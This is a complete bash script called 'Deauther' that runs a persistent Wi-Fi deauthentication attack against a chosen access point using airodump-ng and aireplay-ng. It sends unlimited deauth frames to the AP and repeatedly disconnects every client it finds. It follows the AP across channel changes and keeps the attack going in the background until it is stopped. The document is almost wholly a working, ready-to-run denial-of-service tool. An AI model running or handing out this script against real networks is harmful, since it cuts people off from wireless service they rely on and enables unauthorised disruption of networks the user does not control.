#!/usr/bin/env bash
# Deauther — scan target AP (by BSSID and/or SSID), read airodump-ng CSV "CH",
# and run aireplay-ng deauth in background. Restarts deauth on channel change,
# stops it when AP disappears, and shows a compact live stats title.
#
# CH handling:
#   - Trust airodump AP table "CH". If CH == -1, mark scan as IGNORED.
#   - Only stop an ongoing deauth after 2 consecutive IGNORED results.
#
# Robust kill/spawn:
#   - Start scanners/deauth in their own sessions (setsid), kill by real PGID,
#     and broom with pkill patterns to avoid stragglers.
#
# Messages:
#   - [AIREPLAY] Waiting for beacon...
#   - [AIREPLAY] Deauths started.
#
# Title (updates 2×/sec):
#   Deauther | Target: <SSID/BSSID or whichever was given> | CH: <cur> D: <total> CHD: <per-ch> | OK: <ok> IG: <ig> F: <fail> | Uptime: <pretty>
#
# Stop-file:
#   - Pass a glob pattern via -stopfile "/path/start*end.txt". If any match
#     exists (checked every 5s), the program exits cleanly.
#
# Examples:
#   bash ./deauther.sh -bssid AA:BB:CC:DD:EE:FF -ssid "MyWiFi"
#   bash ./deauther.sh -ssid "MyWiFi"
#   bash ./deauther.sh -bssid AA:BB:CC:DD:EE:FF -i wlan1
#   bash ./deauther.sh -ssid "MyWiFi" -stopfile "/tmp/stop*now.txt"
#
# Requires: bash, iw, airodump-ng, aireplay-ng, awk, ps, setsid, pkill, grep, stdbuf

set -euo pipefail

MAIN_PID="$$"

# ----------------------- Defaults / Globals -----------------------
DEFAULT_IFACES=( "wlan0" "wlan1" "wlan0mon" )
INTERFACE=""
TARGET_BSSID=""
TARGET_SSID=""
TARGET_LABEL=""
STOP_PATTERN=""

# Instance-scoped paths (created after args are validated)
INSTANCE_DIR=""
CSV_PREFIX=""
DEAUTH_LOG=""
TOT_DEAUTH_COUNT_FILE=""
CH_DEAUTH_COUNT_FILE=""
STATUS_FILE=""
CLIENTS_FILE=""

SCAN_TIMEOUT=20      # seconds (full scan)
QUICK_CONFIRM=5      # seconds (if we have a channel hint)
SLEEP_BETWEEN=0.5
CLIENT_ROUND_SECS=10
CLIENT_CMD_TIMEOUT=10
CLIENT_DEAUTH_COUNT=5

# PIDs / PGIDs
DEAUTH_PGID=""
DEAUTH_PID=""
DEAUTH_MON_PGID=""
DEAUTH_MON_PID=""
CLIENT_LOOP_PGID=""
CLIENT_LOOP_PID=""
SCAN_PGID=""
SCAN_PID=""
TITLE_PID=""
STOP_WATCH_PID=""
_SPAWNING=0

# Status
CURRENT_CH=""
CURRENT_BSSID=""
UNKNOWN_CH_STREAK=0

# Guard
_CLEANED_ONCE=0

# Stats / timings
SCANS_OK=0
SCANS_IGNORED=0
SCANS_FAIL=0
START_TS="$(date +%s)"

# ----------------------------- Helpers ----------------------------
usage() {
  cat <<EOF
Usage: $0 -bssid AA:BB:CC:DD:EE:FF [-ssid "MyWiFi"] [-i IFACE] [-stopfile GLOB]
   or: $0 -ssid "MyWiFi" [-i IFACE] [-stopfile GLOB]

Options:
  -bssid     Target AP BSSID (MAC), e.g., AA:BB:CC:DD:EE:FF
  -ssid      Target AP SSID (ESSID), e.g., MyWiFi
  -i         Monitor-capable interface. Defaults to first available of:
             ${DEFAULT_IFACES[*]}
  -stopfile  A file path or wildcard (e.g., /path/start*end.txt). If any match
             exists (checked every 5s), the program exits cleanly.
  -h         Show this help
EOF
}

need_cmd() { command -v "$1" >/dev/null 2>&1 || { echo "Missing command: $1" >&2; exit 1; }; }
iface_exists() { ip link show dev "$1" >/dev/null 2>&1; }
pick_default_iface() {
  for ifc in "${DEFAULT_IFACES[@]}"; do if iface_exists "$ifc"; then INTERFACE="$ifc"; return 0; fi; done
  return 1
}
uppercase_mac() { echo "$1" | tr '[:lower:]' '[:upper:]'; }
get_iface_type() { iw dev "$1" info 2>/dev/null | awk '/type/ {print $2; exit}'; }

ensure_monitor() {
  local ifc="$1" t
  t="$(get_iface_type "$ifc" || true)"
  if [[ "$t" == "monitor" ]]; then return 0; fi
  echo "[*] Switching $ifc to monitor mode..."
  ip link set "$ifc" down || true
  if ! iw dev "$ifc" set type monitor 2>/dev/null; then
    echo "[!] Failed to set $ifc to monitor mode" >&2
    return 1
  fi
  ip link set "$ifc" up || true
  t="$(get_iface_type "$ifc" || true)"
  if [[ "$t" != "monitor" ]]; then
    echo "[!] Monitor mode verification failed on $ifc (type=$t)" >&2
    return 1
  fi
  return 0
}

get_pgid() { ps -o pgid= -p "$1" 2>/dev/null | tr -d '[:space:]'; }

kill_group_strong() {
  # args: pgid(neg ok), pid, broom_pattern(optional)
  local pg="$1" pid="$2" broom="${3:-}"
  [[ "${_SPAWNING}" -eq 1 ]] && sleep 0.2

  if [[ -n "$pid" && -z "$pg" ]]; then
    local realpg; realpg="$(get_pgid "$pid")"
    pg="-$realpg"
    [[ -z "$realpg" ]] && pg="-$pid"
  fi
  if [[ -n "$pg" ]]; then
    kill -INT  -- "$pg" 2>/dev/null || true; sleep 0.1
    kill -TERM -- "$pg" 2>/dev/null || true; sleep 0.1
    kill -KILL -- "$pg" 2>/dev/null || true
    local pospg="${pg#-}"; pkill -g "$pospg" 2>/dev/null || true
  fi
  if [[ -n "$pid" ]]; then
    kill -INT  "$pid" 2>/dev/null || true; sleep 0.05
    kill -TERM "$pid" 2>/dev/null || true; sleep 0.05
    kill -KILL "$pid" 2>/dev/null || true
  fi
  if [[ -n "$broom" ]]; then
    pkill -9 -f "$broom" 2>/dev/null || true
  fi
}

kill_pid_only() {
  # args: pid (do NOT signal the process group)
  local pid="$1"
  [[ -z "$pid" ]] && return 0
  kill -INT  "$pid" 2>/dev/null || true; sleep 0.05
  kill -TERM "$pid" 2>/dev/null || true; sleep 0.05
  kill -KILL "$pid" 2>/dev/null || true
}

cleanup_once() {
  [[ "${_CLEANED_ONCE}" -eq 1 ]] && return 0
  _CLEANED_ONCE=1
  local client_broom=""
  [[ -n "${INTERFACE:-}" ]] && client_broom="aireplay-ng .* -c .* ${INTERFACE}"
  echo "[*] Cleaning up and exiting..."
  [[ -n "$TITLE_PID"      ]] && kill_pid_only "$TITLE_PID"
  [[ -n "$STOP_WATCH_PID" ]] && kill_pid_only "$STOP_WATCH_PID"
  kill_group_strong "$CLIENT_LOOP_PGID" "$CLIENT_LOOP_PID" "$client_broom"
  kill_group_strong "$DEAUTH_MON_PGID" "$DEAUTH_MON_PID" "tail -F ${DEAUTH_LOG:-/dev/null}"
  kill_group_strong "$DEAUTH_PGID"     "$DEAUTH_PID"     "aireplay-ng .* ${INTERFACE:-}"
  kill_group_strong "$SCAN_PGID"       "$SCAN_PID"       "airodump-ng .* -w ${CSV_PREFIX:-/tmp/nowhere}"
  pkill -9 -P "$MAIN_PID" 2>/dev/null || true
  if [[ -n "${INSTANCE_DIR}" ]]; then
    rm -rf "$INSTANCE_DIR" 2>/dev/null || true
  fi
}

cleanup_and_exit() {
  local why="${1:-}"
  cleanup_once
  if [[ "$why" != "EXIT" ]]; then
    exit 0
  fi
}

# ----- Uptime pretty printer (years, weeks, days, hours, minutes, seconds) -----
human_uptime() {
  local s="$1"
  local parts=()
  local y=$(( s/31536000 )); s=$(( s%31536000 ))
  local w=$(( s/604800   )); s=$(( s%604800   ))
  local d=$(( s/86400    )); s=$(( s%86400    ))
  local h=$(( s/3600     )); s=$(( s%3600     ))
  local m=$(( s/60       )); local sec=$(( s%60 ))
  (( y>0 )) && parts+=( "${y}y" )
  (( w>0 )) && parts+=( "${w}w" )
  (( d>0 )) && parts+=( "${d}d" )
  (( h>0 )) && parts+=( "${h}h" )
  (( m>0 )) && parts+=( "${m}m" )
  # Always append seconds; if absolutely nothing else, show "0s" (uptime==0)
  parts+=( "${sec}s" )
  printf "%s" "$(IFS=' '; echo "${parts[*]}")"
}

# ----------------- Stop-file watcher (checks every 5s) ----------------
start_stop_watcher() {
  [[ -z "$STOP_PATTERN" ]] && return 0
  (
    while true; do
      sleep 5
      if compgen -G "$STOP_PATTERN" > /dev/null 2>&1; then
        echo "[*] Stopfile match ($STOP_PATTERN) — terminating."
        kill -INT "$MAIN_PID"
        exit 0
      fi
    done
  ) & disown
  STOP_WATCH_PID="$!"
}

# ---------------------- Status / Title updater --------------------
write_status() {
  [[ -z "$STATUS_FILE" ]] && return 0
  cat > "$STATUS_FILE" <<EOF
SCANS_OK=$SCANS_OK
SCANS_IGNORED=$SCANS_IGNORED
SCANS_FAIL=$SCANS_FAIL
CURRENT_CH=${CURRENT_CH:-}
TARGET_LABEL=${TARGET_LABEL}
START_TS=$START_TS
EOF
}

start_title_updater() {
  (
    while true; do
      # Load status snapshot
      if [[ -f "$STATUS_FILE" ]]; then
        # shellcheck source=/dev/null
        source "$STATUS_FILE"
      fi
      local tot="0" chd="0"
      [[ -f "$TOT_DEAUTH_COUNT_FILE" ]] && tot="$(cat "$TOT_DEAUTH_COUNT_FILE" 2>/dev/null || echo 0)"
      [[ -f "$CH_DEAUTH_COUNT_FILE"  ]] && chd="$(cat "$CH_DEAUTH_COUNT_FILE"  2>/dev/null || echo 0)"
      local now; now="$(date +%s)"
      local up=$((now-START_TS))
      local uptime_str; uptime_str="$(human_uptime "$up")"
      local chdisp="${CURRENT_CH:--}"
      local title="Deauther | Target: ${TARGET_LABEL} | CH: ${chdisp} D: ${tot} CHD: ${chd} | OK: ${SCANS_OK} IG: ${SCANS_IGNORED} F: ${SCANS_FAIL} | Uptime: ${uptime_str}"
      echo -ne "\033]0;${title}\007"
      sleep 0.5
    done
  ) & disown
  TITLE_PID="$!"
}

# ---------------------- CSV parsing helpers ----------------------
latest_csv() {
  local files=()
  shopt -s nullglob
  files=( "${CSV_PREFIX}-"*.csv )
  shopt -u nullglob
  (( ${#files[@]} == 0 )) && return 0
  local newest
  newest="$(stat -c '%Y %n' "${files[@]}" 2>/dev/null | sort -nr | head -n1 | cut -d' ' -f2-)"
  [[ -n "$newest" ]] && echo "$newest"
}
clean_csv()  { rm -f "${CSV_PREFIX}-"*.csv 2>/dev/null || true; }

parse_csv_for_ap() {
  # args: csv_file, want_bssid, want_ssid
  # prints: "BSSID,CH" if match found
  local csv="$1" want_bssid="$2" want_ssid="$3"
  [[ -f "$csv" ]] || return 1
  awk -F',' -v WB="$(uppercase_mac "$want_bssid")" -v WS="$want_ssid" '
    function trim(x){ gsub(/^[ \t]+|[ \t]+$/, "", x); return x }
    BEGIN { in_ap=0 }
    $1 ~ /^BSSID$/        { in_ap=1; next }
    $1 ~ /^Station MAC$/  { in_ap=0; exit }
    in_ap {
      bssid = toupper(trim($1));
      ch    = trim($4);
      essid = trim($14);
      ok=1
      if (WB != "" && bssid != toupper(WB)) ok=0
      if (WS != "" && essid != WS) ok=0
      if (ok) { print bssid "," ch; exit }
    }
  ' "$csv"
}

parse_csv_for_clients() {
  # args: csv_file, want_bssid
  # prints: "STATION_MAC" (one per line)
  local csv="$1" want_bssid="$2"
  [[ -f "$csv" ]] || return 1
  awk -F',' -v WB="$(uppercase_mac "$want_bssid")" '
    function trim(x){ gsub(/^[ \t]+|[ \t]+$/, "", x); return x }
    BEGIN { in_sta=0 }
    $1 ~ /^Station MAC$/  { in_sta=1; next }
    in_sta {
      sta = toupper(trim($1));
      b   = toupper(trim($6));
      if (sta == "") next
      if (WB != "" && b == toupper(WB)) print sta
    }
  ' "$csv"
}

update_clients_from_csv() {
  # args: csv_file, bssid
  local csv="$1" bssid="$2"
  [[ -z "$CLIENTS_FILE" ]] && return 0
  if [[ -z "$bssid" || ! -f "$csv" ]]; then
    : > "$CLIENTS_FILE"
    return 0
  fi
  local tmp="${CLIENTS_FILE}.tmp"
  parse_csv_for_clients "$csv" "$bssid" | sort -u > "$tmp"
  mv -f "$tmp" "$CLIENTS_FILE"
}

clear_clients_file() {
  [[ -z "$CLIENTS_FILE" ]] && return 0
  : > "$CLIENTS_FILE"
}

# --------------------- Scanner (airodump-ng) ---------------------
run_airodump_until_found() {
  # echos:
  #   "OK,BSSID,CH"  (CH numeric, not -1)
  #   "IGNORED"      (CH == -1 or empty)
  #   "TIMEOUT"      (no match by deadline)
  local ifc="$1" want_bssid="$2" want_ssid="$3" hard_t="$4" ch_hint="${5:-}"
  ensure_monitor "$ifc" || { echo "TIMEOUT"; return 0; }

  clean_csv
  _SPAWNING=1
  local cmd=( airodump-ng --output-format csv --write-interval 1 -w "$CSV_PREFIX" )
  if [[ -n "$ch_hint" ]]; then cmd+=( --channel "$ch_hint" ); else cmd+=( --band abg ); fi
  [[ -n "$want_bssid" ]] && cmd+=( --bssid "$want_bssid" )
  cmd+=( "$ifc" )
  setsid "${cmd[@]}" >/dev/null 2>&1 &
  SCAN_PID="$!"
  local realpg; realpg="$(get_pgid "$SCAN_PID")"
  SCAN_PGID="-$SCAN_PID"; [[ -n "$realpg" ]] && SCAN_PGID="-$realpg"
  _SPAWNING=0

  local start_t now_t elapsed csv ap bssid ch_raw ch_val
  start_t="$(date +%s)"
  while :; do
    csv="$(latest_csv)"
    if [[ -n "$csv" ]]; then
      ap="$(parse_csv_for_ap "$csv" "$want_bssid" "$want_ssid" || true)"
      if [[ -n "$ap" ]]; then
        bssid="$(echo "$ap" | awk -F',' '{print $1}')"
        ch_raw="$(echo "$ap" | awk -F',' '{gsub(/ /,"",$2); print $2}')"
        #if [[ -z "$ch_raw" || "$ch_raw" == "-1" ]]; then
          #kill_group_strong "$SCAN_PGID" "$SCAN_PID" "airodump-ng .* -w ${CSV_PREFIX}"
          #SCAN_PGID=""; SCAN_PID=""
          #echo "IGNORED"; return 0
        #fi
        ch_val="$(echo "$ch_raw" | grep -Eo '^[0-9]+' || true)"
        if [[ -n "$ch_val" && "$ch_raw" != "-1" ]]; then
          kill_group_strong "$SCAN_PGID" "$SCAN_PID" "airodump-ng .* -w ${CSV_PREFIX}"
          SCAN_PGID=""; SCAN_PID=""
          echo "OK,${bssid},${ch_val}"; return 0
        fi
      fi
    fi
    now_t="$(date +%s)"; elapsed=$((now_t - start_t))
    if (( elapsed >= hard_t )); then
      kill_group_strong "$SCAN_PGID" "$SCAN_PID" "airodump-ng .* -w ${CSV_PREFIX}"
      SCAN_PGID=""; SCAN_PID=""
      echo "TIMEOUT"; return 0
    fi
    sleep 0.3
  done
}

# ------------- Channel setter with robust fallbacks ---------------
channel_to_freq() {
  local ch="$1"
  if (( ch >= 1 && ch <= 13 )); then echo $((2412 + (ch-1)*5)); return 0; fi
  if (( ch == 14 )); then echo 2484; return 0; fi
  echo $((5000 + ch*5))
}

iw_set_channel() {
  # args: iface, ch
  local ifc="$1" ch="$2"
  if iw dev "$ifc" set channel "$ch" 2>/dev/null; then
    return 0
  fi
  local freq; freq="$(channel_to_freq "$ch")"
  if [[ -n "$freq" ]] && iw dev "$ifc" set freq "$freq" 2>/dev/null; then
    return 0
  fi
  if iw dev "$ifc" set channel "$ch" HT20 2>/dev/null; then
    return 0
  fi
  return 1
}

# ---------------- Deauth control + log monitor -------------------
stop_client_deauth_loop() {
  if [[ -n "$CLIENT_LOOP_PGID" || -n "$CLIENT_LOOP_PID" ]]; then
    local broom=""
    [[ -n "${INTERFACE:-}" ]] && broom="aireplay-ng .* -c .* ${INTERFACE}"
    echo "[*] Stopping client deauth loop..."
    kill_group_strong "$CLIENT_LOOP_PGID" "$CLIENT_LOOP_PID" "$broom"
    CLIENT_LOOP_PGID=""; CLIENT_LOOP_PID=""
  fi
}

start_client_deauth_loop() {
  # args: iface, bssid
  local ifc="$1" bssid="$2"
  [[ -z "$CLIENTS_FILE" ]] && return 0
  stop_client_deauth_loop

  _SPAWNING=1
  # shellcheck disable=SC2016
  setsid bash -c '
    set -euo pipefail
    ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; round_secs="$5"; cmd_timeout="$6"

    log() { printf "[CLIENT] %s\n" "$*"; }

    run_client_once() {
      local client="$1" ifc="$2" bssid="$3" count="$4" timeout_s="$5"
      log "Deauth start: ${client} (${count} pkts)"
      aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$ifc" >/dev/null 2>&1 &
      local pid=$!
      (
        sleep "$timeout_s"
        if kill -0 "$pid" 2>/dev/null; then
          log "Timeout: ${client} (${timeout_s}s) - killing"
        fi
        kill -INT  "$pid" 2>/dev/null || true
        sleep 0.05
        kill -TERM "$pid" 2>/dev/null || true
        sleep 0.05
        kill -KILL "$pid" 2>/dev/null || true
      ) &
      local killer=$!
      wait "$pid" 2>/dev/null || true
      kill -INT  "$killer" 2>/dev/null || true
      kill -TERM "$killer" 2>/dev/null || true
      kill -KILL "$killer" 2>/dev/null || true
      log "Deauth end: ${client}"
    }

    while true; do
      round_start="$(date +%s)"
      clients=()
      if [[ -f "$clients_file" ]]; then
        while IFS= read -r c; do
          [[ -n "$c" ]] && clients+=( "$c" )
        done < "$clients_file"
      fi

      round_has_clients=0
      if (( ${#clients[@]} > 0 )); then
        round_has_clients=1
        log "Round start: ${#clients[@]} client(s)"
      fi
      for c in "${clients[@]}"; do
        run_client_once "$c" "$ifc" "$bssid" "$deauth_count" "$cmd_timeout"
      done

      if (( round_has_clients == 1 )); then
        log "Round end"
      fi
      round_end="$(date +%s)"
      elapsed=$((round_end - round_start))
      if (( elapsed < round_secs )); then
        sleep $((round_secs - elapsed))
      fi
    done
  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_ROUND_SECS" "$CLIENT_CMD_TIMEOUT" &
  CLIENT_LOOP_PID="$!"
  local realpg; realpg="$(get_pgid "$CLIENT_LOOP_PID")"
  CLIENT_LOOP_PGID="-$CLIENT_LOOP_PID"; [[ -n "$realpg" ]] && CLIENT_LOOP_PGID="-$realpg"
  _SPAWNING=0
}

stop_deauth() {
  stop_client_deauth_loop
  clear_clients_file
  if [[ -n "$DEAUTH_MON_PGID" || -n "$DEAUTH_MON_PID" ]]; then
    kill_group_strong "$DEAUTH_MON_PGID" "$DEAUTH_MON_PID" "tail -F ${DEAUTH_LOG}"
    DEAUTH_MON_PGID=""; DEAUTH_MON_PID=""
  fi
  if [[ -n "$DEAUTH_PGID" || -n "$DEAUTH_PID" ]]; then
    echo "[*] Stopping deauth..."
    kill_group_strong "$DEAUTH_PGID" "$DEAUTH_PID" "aireplay-ng .* ${INTERFACE}"
    DEAUTH_PGID=""; DEAUTH_PID=""
  fi
}

start_deauth() {
  # args: iface, bssid, ch
  local ifc="$1" bssid="$2" ch="$3"
  : > "$DEAUTH_LOG"
  : > "$CH_DEAUTH_COUNT_FILE"
  [[ -f "$TOT_DEAUTH_COUNT_FILE" ]] || echo 0 > "$TOT_DEAUTH_COUNT_FILE"

  echo "[AIREPLAY] Waiting for beacon on ch ${ch} for ${bssid}..."

  if ! iw_set_channel "$ifc" "$ch"; then
    echo "[!] Failed to set channel ${ch} (kernel may report disabled). Skipping deauth this round."
    echo "[!!] Setting channel to 11"
    iw_set_channel "$ifc" 11
    #return 1
  fi

  _SPAWNING=1
  setsid stdbuf -oL -eL aireplay-ng --deauth 0 -a "$bssid" "$ifc" >>"$DEAUTH_LOG" 2>&1 &
  DEAUTH_PID="$!"
  local realpg; realpg="$(get_pgid "$DEAUTH_PID")"
  DEAUTH_PGID="-$DEAUTH_PID"; [[ -n "$realpg" ]] && DEAUTH_PGID="-$realpg"
  _SPAWNING=0

  _SPAWNING=1
  setsid bash -c "
    started=0
    while IFS= read -r line; do
      case \"\$line\" in
        *'Waiting for beacon frame'*)
          if [ \"\$started\" -eq 0 ]; then
            echo '[AIREPLAY] Waiting for beacon...'
          fi
          ;;
        *'Sending DeAuth'*)
          c=\$(cat '$CH_DEAUTH_COUNT_FILE' 2>/dev/null || echo 0)
          c=\$((c+1)); echo \$c > '$CH_DEAUTH_COUNT_FILE'
          t=\$(cat '$TOT_DEAUTH_COUNT_FILE' 2>/dev/null || echo 0)
          t=\$((t+1)); echo \$t > '$TOT_DEAUTH_COUNT_FILE'
          if [ \"\$started\" -eq 0 ]; then
            echo '[AIREPLAY] Deauths started.'
            started=1
          fi
          ;;
      esac
    done < <(tail -Fn0 '$DEAUTH_LOG')
  " >/dev/null 2>&1 &
  DEAUTH_MON_PID="$!"
  local monpg; monpg="$(get_pgid "$DEAUTH_MON_PID")"
  DEAUTH_MON_PGID="-$DEAUTH_MON_PID"; [[ -n "$monpg" ]] && DEAUTH_MON_PGID="-$monpg"
  _SPAWNING=0

  CURRENT_CH="$ch"
  CURRENT_BSSID="$bssid"
  start_client_deauth_loop "$ifc" "$bssid"
  echo "[*] Deauth started on ch $CURRENT_CH for $CURRENT_BSSID"
  write_status
}

# --------------------------- Arg parsing --------------------------
if [[ $# -eq 0 ]]; then usage; exit 0; fi
while [[ $# -gt 0 ]]; do
  case "$1" in
    -bssid)    TARGET_BSSID="${2:-}"; shift 2 ;;
    -ssid)     TARGET_SSID="${2:-}";  shift 2 ;;
    -i)        INTERFACE="${2:-}";    shift 2 ;;
    -stopfile) STOP_PATTERN="${2:-}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) echo "Unknown arg: $1" >&2; usage; exit 1 ;;
  esac
done

if [[ -z "$TARGET_BSSID" && -z "$TARGET_SSID" ]]; then
  echo "[!] You must provide at least one of -bssid or -ssid" >&2
  usage; exit 1
fi

# Normalize BSSID if present
[[ -n "$TARGET_BSSID" ]] && TARGET_BSSID="$(uppercase_mac "$TARGET_BSSID")"

# Validate / pick interface before making temp dirs
if [[ -n "$INTERFACE" ]]; then
  iface_exists "$INTERFACE" || { echo "[!] Interface $INTERFACE not found" >&2; exit 1; }
else
  pick_default_iface || { echo "[!] No interface found (tried: ${DEFAULT_IFACES[*]}). Use -i IFACE." >&2; exit 1; }
fi

# Compute user-facing target label for title
if [[ -n "$TARGET_SSID" && -n "$TARGET_BSSID" ]]; then
  TARGET_LABEL="${TARGET_SSID}/${TARGET_BSSID}"
elif [[ -n "$TARGET_SSID" ]]; then
  TARGET_LABEL="${TARGET_SSID}"
else
  TARGET_LABEL="${TARGET_BSSID}"
fi

# Now create instance dir and files
INSTANCE_DIR="$(mktemp -d "/tmp/deauther.${START_TS}.$$.XXXXXX")"
CSV_PREFIX="${INSTANCE_DIR}/scan"
DEAUTH_LOG="${INSTANCE_DIR}/aireplay.log"
TOT_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.total"
CH_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.ch"
STATUS_FILE="${INSTANCE_DIR}/status.env"
CLIENTS_FILE="${INSTANCE_DIR}/clients.list"
echo 0 > "$TOT_DEAUTH_COUNT_FILE"
echo 0 > "$CH_DEAUTH_COUNT_FILE"
: > "$CLIENTS_FILE"
write_status

echo "[INIT] Instance dir: $INSTANCE_DIR"
echo "[INIT] Interface   : $INTERFACE"
echo "[INIT] Target BSSID: ${TARGET_BSSID:-<none>}"
echo "[INIT] Target SSID : ${TARGET_SSID:-<none>}"
[[ -n "$STOP_PATTERN" ]] && echo "[INIT] Stopfile glob: $STOP_PATTERN"

need_cmd iw; need_cmd airodump-ng; need_cmd aireplay-ng; need_cmd awk; need_cmd setsid; need_cmd pkill; need_cmd ps; need_cmd grep; need_cmd stdbuf

trap 'cleanup_and_exit INT'  INT
trap 'cleanup_and_exit TERM' TERM
trap 'cleanup_and_exit EXIT' EXIT

start_stop_watcher
start_title_updater

# ----------------------------- Main loop -------------------------
KNOWN_CH=""
KNOWN_BSSID="${TARGET_BSSID:-}"

while true; do
  ensure_monitor "$INTERFACE" || { echo "[!] Monitor mode unavailable... retrying..."; sleep 1; continue; }

  FOUND_MODE=""
  RES_LINE=""

  # Quick confirm if we have a hint
  if [[ -n "${KNOWN_CH:-}" || -n "${CURRENT_CH:-}" ]]; then
    local_ch="${KNOWN_CH:-$CURRENT_CH}"
    echo "[SCAN] Quick confirm on ch $local_ch..."
    RES_LINE="$(run_airodump_until_found "$INTERFACE" "$KNOWN_BSSID" "$TARGET_SSID" "$QUICK_CONFIRM" "$local_ch")"
    case "$RES_LINE" in
      OK,*)      FOUND_MODE="OK" ;;
      IGNORED)   FOUND_MODE="IGNORED" ;;
      TIMEOUT)   FOUND_MODE="TIMEOUT" ;;
    esac
  fi

  # Full scan otherwise
  if [[ -z "$FOUND_MODE" || "$FOUND_MODE" == "TIMEOUT" ]]; then
    echo "[SCAN] Full scan (≤${SCAN_TIMEOUT}s) on 2.4/5GHz..."
    RES_LINE="$(run_airodump_until_found "$INTERFACE" "$KNOWN_BSSID" "$TARGET_SSID" "$SCAN_TIMEOUT")"
    case "$RES_LINE" in
      OK,*)      FOUND_MODE="OK" ;;
      IGNORED)   FOUND_MODE="IGNORED" ;;
      TIMEOUT)   FOUND_MODE="TIMEOUT" ;;
    esac
  fi

  if [[ "$FOUND_MODE" == "OK" ]]; then
    SCANS_OK=$((SCANS_OK+1))
    UNKNOWN_CH_STREAK=0

    NEW_BSSID="$(echo "$RES_LINE" | awk -F',' '{print $2}')"
    NEW_CH="$(echo "$RES_LINE" | awk -F',' '{print $3}')"

    KNOWN_CH="$NEW_CH"; KNOWN_BSSID="$NEW_BSSID"

    if [[ -z "$DEAUTH_PGID" ]]; then
      start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
    else
      if [[ "$CURRENT_CH" != "$KNOWN_CH" ]]; then
        echo "[*] Channel changed: ${CURRENT_CH} -> ${KNOWN_CH}. Restarting deauth..."
        stop_deauth
        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
      elif [[ "$CURRENT_BSSID" != "$KNOWN_BSSID" ]]; then
        echo "[*] Target BSSID changed: ${CURRENT_BSSID} -> ${KNOWN_BSSID}. Restarting deauth..."
        stop_deauth
        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
      fi
    fi
    csv_file="$(latest_csv || true)"
    if [[ -n "$csv_file" && -n "$KNOWN_BSSID" ]]; then
      update_clients_from_csv "$csv_file" "$KNOWN_BSSID"
    fi
    write_status

  elif [[ "$FOUND_MODE" == "IGNORED" ]]; then
    SCANS_IGNORED=$((SCANS_IGNORED+1))
    UNKNOWN_CH_STREAK=$((UNKNOWN_CH_STREAK+1))
    echo "[SCAN] Found AP but channel is -1 (ignored). Streak=${UNKNOWN_CH_STREAK}"
    if (( UNKNOWN_CH_STREAK >= 2 )); then
      echo "[SCAN] Two consecutive unknown channels. Stopping deauth."
      stop_deauth
    fi
    write_status

  else
    SCANS_FAIL=$((SCANS_FAIL+1))
    UNKNOWN_CH_STREAK=0
    echo "[SCAN] Target not found this round."
    stop_deauth
    write_status
  fi

  sleep "$SLEEP_BETWEEN"
done
